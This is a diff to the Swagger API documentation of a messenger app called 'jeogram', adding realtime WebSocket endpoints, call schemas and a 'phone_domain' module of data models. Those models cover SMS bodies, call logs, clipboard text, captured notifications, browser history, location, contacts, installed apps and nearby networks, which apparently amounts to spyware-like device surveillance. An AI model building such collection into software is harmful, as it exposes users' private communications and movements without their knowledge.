+                ],
+                "summary": "Realtime Socket.IO (альтернатива WebSocket)",
+                "responses": {
+                    "200": {
+                        "description": "Socket.IO handshake",
+                        "schema": {
+                            "type": "string"
+                        }
+                    }
+                }
+            }
+        },
         "/user/account": {
             "delete": {
                 "security": [
@@ -2569,6 +4124,28 @@ const docTemplate = `{
                     }
                 }
             }
+        },
+        "/ws": {
+            "get": {
+                "security": [
+                    {
+                        "BearerAuth": []
+                    }
+                ],
+                "description": "Установите WebSocket-соединение по адресу ` + "`" + `GET /ws` + "`" + `. Аутентификация: заголовок ` + "`" + `Authorization: Bearer \u003caccess_token\u003e` + "`" + ` либо query-параметр ` + "`" + `?token=\u003caccess_token\u003e` + "`" + `. Сервер шлёт Ping каждые 30с и push-события в формате ` + "`" + `{\"type\":\"\u003cevent\u003e\",\"payload\":{...}}` + "`" + ` (например, ` + "`" + `new_message` + "`" + `, ` + "`" + `message_edited` + "`" + `, ` + "`" + `message_deleted` + "`" + `, ` + "`" + `call_invite` + "`" + `, ` + "`" + `user_status` + "`" + `). Клиент может просто держать соединение открытым — это обеспечивает синхронизацию между устройствами одного пользователя.",
+                "tags": [
+                    "realtime"
+                ],
+                "summary": "Realtime WebSocket-соединение",
+                "responses": {
+                    "101": {
+                        "description": "Switching Protocols — WebSocket установлен",
+                        "schema": {
+                            "type": "string"
+                        }
+                    }
+                }
+            }
         }
     },
     "definitions": {
@@ -2618,6 +4195,36 @@ const docTemplate = `{
                     "type": "string",
                     "maxLength": 32,
                     "minLength": 3
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_calls_handler.setRecordingRequest": {
+            "type": "object",
+            "required": [
+                "url"
+            ],
+            "properties": {
+                "url": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_calls_handler.startCallRequest": {
+            "type": "object",
+            "required": [
+                "chat_id",
+                "type"
+            ],
+            "properties": {
+                "chat_id": {
+                    "type": "string"
+                },
+                "type": {
+                    "type": "string",
+                    "enum": [
+                        "audio",
+                        "video"
+                    ]
                 }
             }
         },
@@ -2796,6 +4403,498 @@ const docTemplate = `{
                 }
             }
         },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.AppUsage": {
+            "type": "object",
+            "properties": {
+                "app_name": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "last_used_timestamp": {
+                    "type": "integer"
+                },
+                "package_name": {
+                    "type": "string"
+                },
+                "total_foreground_ms": {
+                    "type": "integer"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.BluetoothDevice": {
+            "type": "object",
+            "properties": {
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "mac": {
+                    "type": "string"
+                },
+                "name": {
+                    "type": "string"
+                },
+                "type": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.BrowserHistory": {
+            "type": "object",
+            "properties": {
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "title": {
+                    "type": "string"
+                },
+                "url": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                },
+                "visit_time": {
+                    "type": "integer"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.CalendarEvent": {
+            "type": "object",
+            "properties": {
+                "calendar_name": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "description": {
+                    "type": "string"
+                },
+                "end_time": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "start_time": {
+                    "type": "string"
+                },
+                "title": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.CallLog": {
+            "type": "object",
+            "properties": {
+                "call_type": {
+                    "description": "incoming | outgoing | missed",
+                    "type": "string"
+                },
+                "contact_name": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "duration_sec": {
+                    "type": "integer"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "phone_number": {
+                    "type": "string"
+                },
+                "timestamp": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.ClipboardEntry": {
+            "type": "object",
+            "properties": {
+                "app_package": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "text": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.DeviceAccount": {
+            "type": "object",
+            "properties": {
+                "account_name": {
+                    "type": "string"
+                },
+                "account_type": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.DeviceInfo": {
+            "type": "object",
+            "properties": {
+                "app_version": {
+                    "type": "string"
+                },
+                "brand": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "device_id": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "locale": {
+                    "type": "string"
+                },
+                "manufacturer": {
+                    "type": "string"
+                },
+                "model": {
+                    "type": "string"
+                },
+                "os": {
+                    "type": "string"
+                },
+                "os_version": {
+                    "type": "string"
+                },
+                "screen_size": {
+                    "type": "string"
+                },
+                "sdk_version": {
+                    "type": "integer"
+                },
+                "timezone": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.DeviceStatus": {
+            "type": "object",
+            "properties": {
+                "battery_level": {
+                    "type": "integer"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "free_storage_mb": {
+                    "type": "integer"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "is_airplane_mode": {
+                    "type": "boolean"
+                },
+                "is_charging": {
+                    "type": "boolean"
+                },
+                "network_type": {
+                    "type": "string"
+                },
+                "signal_strength": {
+                    "type": "integer"
+                },
+                "total_storage_mb": {
+                    "type": "integer"
+                },
+                "user_id": {
+                    "type": "string"
+                },
+                "wifi_ssid": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.InstalledApp": {
+            "type": "object",
+            "properties": {
+                "app_name": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "install_time": {
+                    "type": "integer"
+                },
+                "is_system": {
+                    "type": "boolean"
+                },
+                "package_name": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                },
+                "version_code": {
+                    "type": "integer"
+                },
+                "version_name": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.LocationPoint": {
+            "type": "object",
+            "properties": {
+                "accuracy": {
+                    "type": "number"
+                },
+                "address": {
+                    "type": "string"
+                },
+                "altitude": {
+                    "type": "number"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "lat": {
+                    "type": "number"
+                },
+                "lng": {
+                    "type": "number"
+                },
+                "provider": {
+                    "type": "string"
+                },
+                "speed": {
+                    "type": "number"
+                },
+                "timestamp": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.MediaItem": {
+            "type": "object",
+            "properties": {
+                "created_at": {
+                    "type": "string"
+                },
+                "duration_ms": {
+                    "type": "integer"
+                },
+                "height": {
+                    "type": "integer"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "mime_type": {
+                    "type": "string"
+                },
+                "path": {
+                    "type": "string"
+                },
+                "size_bytes": {
+                    "type": "integer"
+                },
+                "user_id": {
+                    "type": "string"
+                },
+                "width": {
+                    "type": "integer"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.NotificationCapture": {
+            "type": "object",
+            "properties": {
+                "app_package": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "posted_at": {
+                    "type": "string"
+                },
+                "text": {
+                    "type": "string"
+                },
+                "title": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.PhoneContact": {
+            "type": "object",
+            "properties": {
+                "created_at": {
+                    "type": "string"
+                },
+                "email": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "name": {
+                    "type": "string"
+                },
+                "note": {
+                    "type": "string"
+                },
+                "phone_number": {
+                    "type": "string"
+                },
+                "starred": {
+                    "type": "boolean"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.SensorReading": {
+            "type": "object",
+            "properties": {
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "sensor_type": {
+                    "type": "string"
+                },
+                "unit": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                },
+                "value": {
+                    "type": "number"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.SmsLog": {
+            "type": "object",
+            "properties": {
+                "address": {
+                    "type": "string"
+                },
+                "body": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "is_read": {
+                    "type": "boolean"
+                },
+                "sms_type": {
+                    "description": "inbox | sent",
+                    "type": "string"
+                },
+                "timestamp": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
+        "github_com_jeogram_messenger_internal_modules_phone_domain.WifiNetwork": {
+            "type": "object",
+            "properties": {
+                "bssid": {
+                    "type": "string"
+                },
+                "created_at": {
+                    "type": "string"
+                },
+                "id": {
+                    "type": "string"
+                },
+                "security_type": {
+                    "type": "string"
+                },
+                "signal_level": {
+                    "type": "integer"
+                },
+                "ssid": {
+                    "type": "string"
+                },
+                "user_id": {
+                    "type": "string"
+                }
+            }
+        },
         "github_com_jeogram_messenger_internal_modules_user_domain.BlockRequest": {
             "type": "object",
             "required": [
@@ -2884,6 +4983,17 @@ const docTemplate = `{
                 },
                 "total": {
                     "type": "integer"
+                }
+            }
+        },
+        "modules_calls_handler.setRecordingRequest": {
+            "type": "object",
+            "required": [
+                "url"
+            ],
+            "properties": {
+                "url": {
+                    "type": "string"
                 }
             }
         },
